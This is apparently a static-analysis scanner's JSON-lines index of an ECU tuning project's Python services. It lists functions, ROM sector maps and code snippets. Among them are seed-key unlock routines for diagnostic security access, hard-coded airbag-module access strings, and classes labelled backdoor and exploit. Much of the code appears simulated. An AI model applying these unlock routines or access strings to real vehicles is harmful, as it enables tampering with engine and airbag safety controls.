{"file_path": "src/muts/services/metadata.py", "lines_read": 54, "features_found": [{"type": "function", "name": "__init__", "line": 12}, {"type": "function", "name": "discover", "line": 15}, {"type": "function", "name": "_summarize", "line": 26}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "re", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "Iterable", "line": null}], "components_found": [{"type": "class", "name": "MetadataService", "line": 11}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/services/mpsrom_stack.py", "lines_read": 210, "features_found": [{"type": "function", "name": "__init__", "line": 23}, {"type": "function", "name": "_load_definitions", "line": 34}, {"type": "function", "name": "list_sectors", "line": 56}, {"type": "function", "name": "read_sector", "line": 59}, {"type": "function", "name": "dump_all", "line": 65}, {"type": "function", "name": "write_at", "line": 68}, {"type": "function", "name": "read_bytes", "line": 71}, {"type": "function", "name": "__init__", "line": 78}, {"type": "function", "name": "initialize_checksums", "line": 82}, {"type": "function", "name": "calculate", "line": 89}, {"type": "function", "name": "verify", "line": 101}, {"type": "function", "name": "patch", "line": 110}, {"type": "function", "name": "_sum16", "line": 117}, {"type": "function", "name": "_store", "line": 124}, {"type": "function", "name": "_read", "line": 128}, {"type": "function", "name": "__init__", "line": 136}, {"type": "function", "name": "request_seed", "line": 140}, {"type": "function", "name": "calculate_key", "line": 144}, {"type": "function", "name": "verify_key", "line": 151}, {"type": "function", "name": "unlock_to", "line": 155}, {"type": "function", "name": "__init__", "line": 167}, {"type": "function", "name": "_load_maps", "line": 170}, {"type": "function", "name": "groups", "line": 186}, {"type": "function", "name": "entries_in_group", "line": 189}, {"type": "function", "name": "describe", "line": 192}, {"type": "function", "name": "__init__", "line": 197}, {"type": "function", "name": "summary", "line": 204}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".diagnostic_manager", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "binascii", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "zlib", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "DiagnosticManager,", "line": null}], "components_found": [{"type": "class", "name": "ROMDefinition", "line": 14}, {"type": "class", "name": "ROMAnalyzer", "line": 22}, {"type": "class", "name": "ChecksumAnalyzer", "line": 75}, {"type": "class", "name": "SecurityAccessService", "line": 133}, {"type": "class", "name": "MapLibrary", "line": 166}, {"type": "class", "name": "MPSROMCoordinator", "line": 196}], "algorithms": [{"type": "algorithm_function", "line": 85, "content": "if defn.checksum_offset and defn.checksum_algorithm:"}, {"type": "algorithm_function", "line": 86, "content": "calc = self.calculate(name, defn.checksum_algorithm)"}, {"type": "algorithm_function", "line": 89, "content": "def calculate(self, sector_name: str, algorithm: str) -> int:"}, {"type": "algorithm_function", "line": 103, "content": "if not defn.checksum_offset or not defn.checksum_algorithm:"}, {"type": "algorithm_function", "line": 106, "content": "calculated = self.calculate(sector_name, defn.checksum_algorithm)"}, {"type": "algorithm_function", "line": 112, "content": "if not defn.checksum_offset or not defn.checksum_algorithm:"}, {"type": "algorithm_function", "line": 114, "content": "value = self.calculate(sector_name, defn.checksum_algorithm)"}, {"type": "algorithm_function", "line": 125, "content": "size = 4 if defn.checksum_algorithm != \"CRC16\" else 2"}, {"type": "algorithm_function", "line": 129, "content": "size = 4 if defn.checksum_algorithm != \"CRC16\" else 2"}, {"type": "algorithm_function", "line": 144, "content": "def calculate_key(self, level: int) -> int:"}], "protocols": [{"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "total_size = max(max_address, checksum_max) + 0x100"}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "0x000000, 0x010000, \"Bootloader & security\", checksum_offset=0x00FFFC, checksum_algorithm=\"SUM16\""}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "0x010000, 0x080000, \"Calibration tables\", checksum_offset=0x1FFFF0, checksum_algorithm=\"CRC32\""}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "0x110000, 0x040000, \"ECU operating system\", checksum_offset=0x14FFFC, checksum_algorithm=\"CRC16\""}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "0x150000, 0x020000, \"Fault & DTC storage\""}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "0x170000, 0x020000, \"Adaptive learning data\""}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "0x190000, 0x001000, \"VIN & vehicle info\""}, {"type": "protocol", "line": 93, "protocol": "0x[0-9A-Fa-f]+", "content": "return zlib.crc32(data) & 0xFFFFFFFF"}, {"type": "protocol", "line": 95, "protocol": "0x[0-9A-Fa-f]+", "content": "return binascii.crc_hqx(data, 0xFFFF)"}, {"type": "protocol", "line": 121, "protocol": "0x[0-9A-Fa-f]+", "content": "total = (total + (data[i] << 8) + data[i + 1]) & 0xFFFF"}, {"type": "protocol", "line": 147, "protocol": "0x[0-9A-Fa-f]+", "content": "mask = 0xA5C7E93D ^ (level << 8)"}, {"type": "protocol", "line": 148, "protocol": "0x[0-9A-Fa-f]+", "content": "key = ((self.seed ^ mask) + (level * 0x1001)) & 0xFFFFFFFF"}, {"type": "protocol", "line": 173, "protocol": "0x[0-9A-Fa-f]+", "content": "\"primary_timing\": {\"address\": \"0x012000\", \"type\": \"16x16\", \"description\": \"Basic ignition advance\"},"}, {"type": "protocol", "line": 174, "protocol": "0x[0-9A-Fa-f]+", "content": "\"cold_temp\": {\"address\": \"0x012C00\", \"type\": \"8x8\", \"description\": \"Cold temp correction\"},"}, {"type": "protocol", "line": 177, "protocol": "0x[0-9A-Fa-f]+", "content": "\"primary_fuel\": {\"address\": \"0x013000\", \"type\": \"16x16\", \"description\": \"Main fuel table\"},"}, {"type": "protocol", "line": 178, "protocol": "0x[0-9A-Fa-f]+", "content": "\"wot_enrich\": {\"address\": \"0x013400\", \"type\": \"8x8\", \"description\": \"Wide open throttle enrichment\"}"}, {"type": "protocol", "line": 181, "protocol": "0x[0-9A-Fa-f]+", "content": "\"boost_target\": {\"address\": \"0x014000\", \"type\": \"16x16\", \"description\": \"Target boost by load\"},"}, {"type": "protocol", "line": 182, "protocol": "0x[0-9A-Fa-f]+", "content": "\"wastegate\": {\"address\": \"0x014400\", \"type\": \"16x16\", \"description\": \"Wastegate duty cycle\"},"}], "hardware_assumptions": [{"type": "hardware", "line": 37, "hardware": "ECU", "content": "0x000000, 0x010000, \"Bootloader & security\", checksum_offset=0x00FFFC, checksum_algorithm=\"SUM16\""}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "0x110000, 0x040000, \"ECU operating system\", checksum_offset=0x14FFFC, checksum_algorithm=\"CRC16\""}, {"type": "hardware", "line": 51, "hardware": "vehicle", "content": "\"vehicle_data\": ROMDefinition("}, {"type": "hardware", "line": 52, "hardware": "vehicle", "content": "0x190000, 0x001000, \"VIN & vehicle info\""}, {"type": "hardware", "line": 133, "hardware": "ECU", "content": "class SecurityAccessService:"}, {"type": "hardware", "line": 200, "hardware": "ECU", "content": "self.security = SecurityAccessService()"}, {"type": "hardware", "line": 207, "hardware": "ECU", "content": "\"security_level\": f\"{self.security.unlocked_level}\","}], "security_logic": [{"type": "security_pattern", "line": 19, "pattern": "algorithm", "content": "checksum_algorithm: Optional[str] = None"}, {"type": "security_pattern", "line": 37, "pattern": "algorithm", "content": "0x000000, 0x010000, \"Bootloader & security\", checksum_offset=0x00FFFC, checksum_algorithm=\"SUM16\""}, {"type": "security_pattern", "line": 40, "pattern": "algorithm", "content": "0x010000, 0x080000, \"Calibration tables\", checksum_offset=0x1FFFF0, checksum_algorithm=\"CRC32\""}, {"type": "security_pattern", "line": 43, "pattern": "algorithm", "content": "0x110000, 0x040000, \"ECU operating system\", checksum_offset=0x14FFFC, checksum_algorithm=\"CRC16\""}, {"type": "security_pattern", "line": 57, "pattern": "key", "content": "return sorted(self.definitions.keys())"}, {"type": "security_pattern", "line": 76, "pattern": "algorithm", "content": "ALGORITHMS = {\"CRC32\", \"CRC16\", \"SUM16\"}"}, {"type": "security_pattern", "line": 85, "pattern": "algorithm", "content": "if defn.checksum_offset and defn.checksum_algorithm:"}, {"type": "security_pattern", "line": 86, "pattern": "algorithm", "content": "calc = self.calculate(name, defn.checksum_algorithm)"}, {"type": "security_pattern", "line": 89, "pattern": "algorithm", "content": "def calculate(self, sector_name: str, algorithm: str) -> int:"}, {"type": "security_pattern", "line": 91, "pattern": "algorithm", "content": "match algorithm.upper():"}, {"type": "security_pattern", "line": 99, "pattern": "algorithm", "content": "raise ValueError(f\"Unsupported algorithm {algorithm}\")"}, {"type": "security_pattern", "line": 103, "pattern": "algorithm", "content": "if not defn.checksum_offset or not defn.checksum_algorithm:"}, {"type": "security_pattern", "line": 106, "pattern": "algorithm", "content": "calculated = self.calculate(sector_name, defn.checksum_algorithm)"}, {"type": "security_pattern", "line": 112, "pattern": "algorithm", "content": "if not defn.checksum_offset or not defn.checksum_algorithm:"}, {"type": "security_pattern", "line": 114, "pattern": "algorithm", "content": "value = self.calculate(sector_name, defn.checksum_algorithm)"}, {"type": "security_pattern", "line": 125, "pattern": "algorithm", "content": "size = 4 if defn.checksum_algorithm != \"CRC16\" else 2"}, {"type": "security_pattern", "line": 129, "pattern": "algorithm", "content": "size = 4 if defn.checksum_algorithm != \"CRC16\" else 2"}, {"type": "security_pattern", "line": 137, "pattern": "seed", "content": "self.seed = None"}, {"type": "security_pattern", "line": 140, "pattern": "seed", "content": "def request_seed(self) -> int:"}, {"type": "security_pattern", "line": 141, "pattern": "seed", "content": "self.seed = random.getrandbits(32)"}, {"type": "security_pattern", "line": 142, "pattern": "seed", "content": "return self.seed"}, {"type": "security_pattern", "line": 144, "pattern": "key", "content": "def calculate_key(self, level: int) -> int:"}, {"type": "security_pattern", "line": 145, "pattern": "seed", "content": "if self.seed is None:"}, {"type": "security_pattern", "line": 146, "pattern": "seed", "content": "self.request_seed()"}, {"type": "security_pattern", "line": 148, "pattern": "key", "content": "key = ((self.seed ^ mask) + (level * 0x1001)) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 148, "pattern": "seed", "content": "key = ((self.seed ^ mask) + (level * 0x1001)) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 149, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 151, "pattern": "key", "content": "def verify_key(self, level: int, key: int) -> bool:"}, {"type": "security_pattern", "line": 152, "pattern": "key", "content": "expected = self.calculate_key(level)"}, {"type": "security_pattern", "line": 153, "pattern": "key", "content": "return key == expected"}, {"type": "security_pattern", "line": 158, "pattern": "seed", "content": "seed = self.request_seed()"}, {"type": "security_pattern", "line": 159, "pattern": "key", "content": "key = self.calculate_key(level)"}, {"type": "security_pattern", "line": 160, "pattern": "key", "content": "if self.verify_key(level, key):"}, {"type": "security_pattern", "line": 187, "pattern": "key", "content": "return list(self.entries.keys())"}, {"type": "security_pattern", "line": 190, "pattern": "key", "content": "return list(self.entries.get(group, {}).keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/services/muts_stack.py", "lines_read": 136, "features_found": [{"type": "function", "name": "__init__", "line": 13}, {"type": "function", "name": "request_seed", "line": 17}, {"type": "function", "name": "calculate_key", "line": 21}, {"type": "function", "name": "unlock", "line": 30}, {"type": "function", "name": "__init__", "line": 50}, {"type": "function", "name": "attempt_unlock", "line": 54}, {"type": "function", "name": "current_status", "line": 62}, {"type": "function", "name": "__init__", "line": 67}, {"type": "function", "name": "apply_patch", "line": 70}, {"type": "function", "name": "patch_history", "line": 75}, {"type": "function", "name": "__init__", "line": 80}, {"type": "function", "name": "engage", "line": 88}, {"type": "function", "name": "history", "line": 94}, {"type": "function", "name": "simulate_racing_feature", "line": 99}, {"type": "function", "name": "list_features", "line": 102}, {"type": "function", "name": "entries", "line": 111}, {"type": "function", "name": "__init__", "line": 120}, {"type": "function", "name": "summary", "line": 129}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".diagnostic_manager", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "DiagnosticManager,", "line": null}], "components_found": [{"type": "class", "name": "MutsSecurityService", "line": 10}, {"type": "class", "name": "MutsSRSService", "line": 42}, {"type": "class", "name": "MutsEEPROMService", "line": 66}, {"type": "class", "name": "MutsBackdoorService", "line": 79}, {"type": "class", "name": "MutsExploitService", "line": 98}, {"type": "class", "name": "MutsKnowledgeService", "line": 110}, {"type": "class", "name": "MutsCoordinator", "line": 119}], "algorithms": [{"type": "algorithm_function", "line": 21, "content": "def calculate_key(self, level: int) -> int:"}], "protocols": [{"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "((seed ^ 0x73A1) + (level << 4))"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": ") & 0xFFFF"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "key ^= 0x55AA"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "if (key ^ seed) & 0xFF != 0xAA:  # silly check"}], "hardware_assumptions": [{"type": "hardware", "line": 10, "hardware": "ECU", "content": "class MutsSecurityService:"}, {"type": "hardware", "line": 42, "hardware": "SRS", "content": "class MutsSRSService:"}, {"type": "hardware", "line": 44, "hardware": "SRS", "content": "\"SRS-TECH-ACCESS-2024\","}, {"type": "hardware", "line": 47, "hardware": "SRS", "content": "\"MAZDA-SRS-ADMIN-2287\","}, {"type": "hardware", "line": 115, "hardware": "ECU", "content": "\"Race engineering reference: training on safe limits, data retention, and security bypass\","}, {"type": "hardware", "line": 121, "hardware": "ECU", "content": "self.security = MutsSecurityService()"}, {"type": "hardware", "line": 122, "hardware": "SRS", "content": "self.srs = MutsSRSService()"}, {"type": "hardware", "line": 131, "hardware": "ECU", "content": "\"security_level\": str(self.security.unlocked_level),"}, {"type": "hardware", "line": 132, "hardware": "SRS", "content": "\"srs_status\": \"unlocked\" if self.srs.granted else \"locked\","}], "security_logic": [{"type": "security_pattern", "line": 14, "pattern": "seed", "content": "self.last_seed = 0"}, {"type": "security_pattern", "line": 17, "pattern": "seed", "content": "def request_seed(self, level: int) -> int:"}, {"type": "security_pattern", "line": 18, "pattern": "seed", "content": "self.last_seed = random.getrandbits(16)"}, {"type": "security_pattern", "line": 19, "pattern": "seed", "content": "return self.last_seed"}, {"type": "security_pattern", "line": 21, "pattern": "key", "content": "def calculate_key(self, level: int) -> int:"}, {"type": "security_pattern", "line": 22, "pattern": "seed", "content": "seed = self.last_seed or self.request_seed(level)"}, {"type": "security_pattern", "line": 23, "pattern": "key", "content": "key = ("}, {"type": "security_pattern", "line": 24, "pattern": "seed", "content": "((seed ^ 0x73A1) + (level << 4))"}, {"type": "security_pattern", "line": 25, "pattern": "seed", "content": "^ ((seed << (level % 8)) | (seed >> (16 - (level % 8))))"}, {"type": "security_pattern", "line": 27, "pattern": "key", "content": "key ^= 0x55AA"}, {"type": "security_pattern", "line": 28, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 34, "pattern": "seed", "content": "seed = self.request_seed(lvl)"}, {"type": "security_pattern", "line": 35, "pattern": "key", "content": "key = self.calculate_key(lvl)"}, {"type": "security_pattern", "line": 36, "pattern": "key", "content": "if (key ^ seed) & 0xFF != 0xAA:  # silly check"}, {"type": "security_pattern", "line": 36, "pattern": "seed", "content": "if (key ^ seed) & 0xFF != 0xAA:  # silly check"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/services/queue.py", "lines_read": 21, "features_found": [{"type": "function", "name": "__init__", "line": 5}, {"type": "function", "name": "push_many", "line": 8}, {"type": "function", "name": "drain_sim", "line": 12}, {"type": "import", "module": "collections", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "deque", "line": null}, {"type": "import", "module": "Dict,", "line": null}], "components_found": [{"type": "class", "name": "ECUQueue", "line": 4}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "ECU", "content": "class ECUQueue:"}, {"type": "hardware", "line": 13, "hardware": "ECU", "content": "\"\"\"Simulate sending all queued actions to ECU. Returns count.\"\"\""}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "queue = ECUQueue()"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/services/repository_catalog.py", "lines_read": 109, "features_found": [{"type": "function", "name": "__init__", "line": 35}, {"type": "function", "name": "catalog", "line": 38}, {"type": "function", "name": "_extract_doc", "line": 64}, {"type": "function", "name": "_load_document", "line": 83}, {"type": "function", "name": "_read_lines", "line": 100}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "Iterable,", "line": null}], "components_found": [{"type": "class", "name": "FileSummary", "line": 9}, {"type": "class", "name": "DirectoryCatalog", "line": 16}, {"type": "class", "name": "RepositoryCatalogService", "line": 23}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 29, "hardware": "ECU", "content": "\"security\","}], "security_logic": [{"type": "security_pattern", "line": 96, "pattern": "key", "content": "if contains and any(keyword in name for keyword in contains):"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/services/security.py", "lines_read": 13, "features_found": [{"type": "function", "name": "enable_valet", "line": 4}, {"type": "function", "name": "disable_valet", "line": 10}, {"type": "import", "module": ".queue", "line": null}, {"type": "import", "module": "queue", "line": null}], "components_found": [{"type": "class", "name": "SecurityService", "line": 3}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 3, "hardware": "ECU", "content": "class SecurityService:"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["security"]}
{"file_path": "src/muts/services/torque_swas.py", "lines_read": 9, "features_found": [{"type": "function", "name": "queue_actions", "line": 5}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".queue", "line": null}, {"type": "import", "module": "List,", "line": null}, {"type": "import", "module": "queue", "line": null}], "components_found": [{"type": "class", "name": "TorqueSWASService", "line": 4}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/services/tune_library.py", "lines_read": 108, "features_found": [{"type": "function", "name": "__init__", "line": 94}, {"type": "function", "name": "categories", "line": 100}, {"type": "function", "name": "get_tunes", "line": 103}, {"type": "function", "name": "get_metadata", "line": 106}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Dict,", "line": null}], "components_found": [{"type": "class", "name": "TuneMetadata", "line": 8}, {"type": "class", "name": "TuneLibraryService", "line": 93}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [{"type": "security_pattern", "line": 101, "pattern": "key", "content": "return list(self._categories.keys())"}, {"type": "security_pattern", "line": 106, "pattern": "key", "content": "def get_metadata(self, category: str, tune_key: str) -> TuneMetadata:"}, {"type": "security_pattern", "line": 107, "pattern": "key", "content": "return self._categories[category][tune_key]"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/services/versa_stack.py", "lines_read": 132, "features_found": [{"type": "function", "name": "__init__", "line": 20}, {"type": "function", "name": "connect", "line": 24}, {"type": "function", "name": "disconnect", "line": 29}, {"type": "function", "name": "send_request", "line": 32}, {"type": "function", "name": "__init__", "line": 43}, {"type": "function", "name": "_derive_key", "line": 47}, {"type": "function", "name": "unlock", "line": 53}, {"type": "function", "name": "__init__", "line": 79}, {"type": "function", "name": "read_sector", "line": 82}, {"type": "function", "name": "write_sector", "line": 85}, {"type": "function", "name": "checksum", "line": 91}, {"type": "function", "name": "__init__", "line": 97}, {"type": "function", "name": "list_maps", "line": 104}, {"type": "function", "name": "read_map", "line": 107}, {"type": "function", "name": "adjust_cell", "line": 110}, {"type": "function", "name": "__init__", "line": 119}, {"type": "function", "name": "summary", "line": 126}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".queue", "line": null}, {"type": "import", "module": ".diagnostic_manager", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "binascii", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "queue", "line": null}, {"type": "import", "module": "DiagnosticManager,", "line": null}], "components_found": [{"type": "class", "name": "VersaCommunicator", "line": 13}, {"type": "class", "name": "VersaSecurityManager", "line": 40}, {"type": "class", "name": "VersaROMOperations", "line": 72}, {"type": "class", "name": "VersaMapManager", "line": 96}, {"type": "class", "name": "VersaCoordinator", "line": 118}], "algorithms": [{"type": "algorithm_function", "line": 47, "content": "def _derive_key(self, seed: int, level: int) -> int:"}], "protocols": [{"type": "protocol", "line": 15, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x27, 0x01): b\"\\x67\\x01\" + b\"\\x0A\\x0B\\x0C\\x0D\","}, {"type": "protocol", "line": 16, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x22, 0xF1): b\"\\x62\\xF1\\x90\" + b\"7AT0C13JX20200064\","}, {"type": "protocol", "line": 17, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x10, 0x02): b\"\\x50\\x02\","}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVELS = [0x01, 0x03, 0x05, 0x07]"}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "key = seed ^ (0xA5C7 << (level % 4))"}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "key = ((key << 3) | (key >> 29)) & 0xFFFFFFFF"}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "key = (key + (level * 0x1001)) & 0xFFFFFFFF"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "def unlock(self, target: int = 0x05) -> bool:"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "seed_data = self.communicator.send_request(0x27, level)"}, {"type": "protocol", "line": 65, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.communicator.send_request(0x27, level + 1, key.to_bytes(4, \"big\"))"}, {"type": "protocol", "line": 66, "protocol": "0x[0-9A-Fa-f]+", "content": "if not response or response[0] != 0x67:"}, {"type": "protocol", "line": 74, "protocol": "0x[0-9A-Fa-f]+", "content": "\"boot_sector\": (0x000000, 0x010000),"}, {"type": "protocol", "line": 75, "protocol": "0x[0-9A-Fa-f]+", "content": "\"calibration\": (0x010000, 0x080000),"}, {"type": "protocol", "line": 76, "protocol": "0x[0-9A-Fa-f]+", "content": "\"fault_memory\": (0x150000, 0x020000),"}, {"type": "protocol", "line": 93, "protocol": "0x[0-9A-Fa-f]+", "content": "return hex(binascii.crc32(data) & 0xFFFFFFFF)"}], "hardware_assumptions": [{"type": "hardware", "line": 40, "hardware": "ECU", "content": "class VersaSecurityManager:"}, {"type": "hardware", "line": 121, "hardware": "ECU", "content": "self.security = VersaSecurityManager(self.communicator)"}, {"type": "hardware", "line": 129, "hardware": "ECU", "content": "\"security_level\": f\"{self.security.unlocked_level:02X}\","}], "security_logic": [{"type": "security_pattern", "line": 35, "pattern": "key", "content": "key = (service, subfunction)"}, {"type": "security_pattern", "line": 37, "pattern": "key", "content": "return self.RESPONSES.get(key, b\"\\x7F\\x00\")"}, {"type": "security_pattern", "line": 47, "pattern": "key", "content": "def _derive_key(self, seed: int, level: int) -> int:"}, {"type": "security_pattern", "line": 47, "pattern": "seed", "content": "def _derive_key(self, seed: int, level: int) -> int:"}, {"type": "security_pattern", "line": 48, "pattern": "key", "content": "key = seed ^ (0xA5C7 << (level % 4))"}, {"type": "security_pattern", "line": 48, "pattern": "seed", "content": "key = seed ^ (0xA5C7 << (level % 4))"}, {"type": "security_pattern", "line": 49, "pattern": "key", "content": "key = ((key << 3) | (key >> 29)) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 50, "pattern": "key", "content": "key = (key + (level * 0x1001)) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 51, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 60, "pattern": "seed", "content": "seed_data = self.communicator.send_request(0x27, level)"}, {"type": "security_pattern", "line": 61, "pattern": "seed", "content": "if len(seed_data) < 6:"}, {"type": "security_pattern", "line": 63, "pattern": "seed", "content": "seed = int.from_bytes(seed_data[2:6], \"big\")"}, {"type": "security_pattern", "line": 64, "pattern": "key", "content": "key = self._derive_key(seed, level)"}, {"type": "security_pattern", "line": 64, "pattern": "seed", "content": "key = self._derive_key(seed, level)"}, {"type": "security_pattern", "line": 65, "pattern": "key", "content": "response = self.communicator.send_request(0x27, level + 1, key.to_bytes(4, \"big\"))"}, {"type": "security_pattern", "line": 105, "pattern": "key", "content": "return list(self.maps.keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/storage.py", "lines_read": 78, "features_found": [{"type": "function", "name": "init_db", "line": 51}, {"type": "function", "name": "get_connection", "line": 58}, {"type": "function", "name": "ensure_demo_vehicle", "line": 67}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "contextlib", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "sqlite3", "line": null}, {"type": "import", "module": "contextmanager", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Path", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 11, "hardware": "vehicle", "content": "CREATE TABLE IF NOT EXISTS vehicles ("}, {"type": "hardware", "line": 14, "hardware": "ECU", "content": "ecu_type TEXT NOT NULL,"}, {"type": "hardware", "line": 18, "hardware": "ECU", "content": "CREATE TABLE IF NOT EXISTS ecu_data ("}, {"type": "hardware", "line": 20, "hardware": "vehicle", "content": "vehicle_id TEXT NOT NULL,"}, {"type": "hardware", "line": 35, "hardware": "vehicle", "content": "FOREIGN KEY(vehicle_id) REFERENCES vehicles(id)"}, {"type": "hardware", "line": 40, "hardware": "vehicle", "content": "vehicle_id TEXT NOT NULL,"}, {"type": "hardware", "line": 46, "hardware": "vehicle", "content": "FOREIGN KEY(vehicle_id) REFERENCES vehicles(id)"}, {"type": "hardware", "line": 54, "hardware": "ECU", "content": "conn.executescript(SCHEMA)"}, {"type": "hardware", "line": 67, "hardware": "vehicle", "content": "def ensure_demo_vehicle(vin: str = \"7AT0C13JX20200064\") -> None:"}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "cursor = conn.execute(\"SELECT id FROM vehicles WHERE id = ?\", (vin,))"}, {"type": "hardware", "line": 70, "hardware": "vehicle", "content": "cursor = conn.execute(\"SELECT id FROM vehicles WHERE id = ?\", (vin,))"}, {"type": "hardware", "line": 73, "hardware": "ECU", "content": "conn.execute("}, {"type": "hardware", "line": 74, "hardware": "ECU", "content": "\"INSERT INTO vehicles (id, model, ecu_type, created_at) VALUES (?, ?, ?, ?)\","}, {"type": "hardware", "line": 74, "hardware": "vehicle", "content": "\"INSERT INTO vehicles (id, model, ecu_type, created_at) VALUES (?, ?, ?, ?)\","}], "security_logic": [{"type": "security_pattern", "line": 12, "pattern": "key", "content": "id TEXT PRIMARY KEY,"}, {"type": "security_pattern", "line": 19, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 35, "pattern": "key", "content": "FOREIGN KEY(vehicle_id) REFERENCES vehicles(id)"}, {"type": "security_pattern", "line": 39, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 46, "pattern": "key", "content": "FOREIGN KEY(vehicle_id) REFERENCES vehicles(id)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
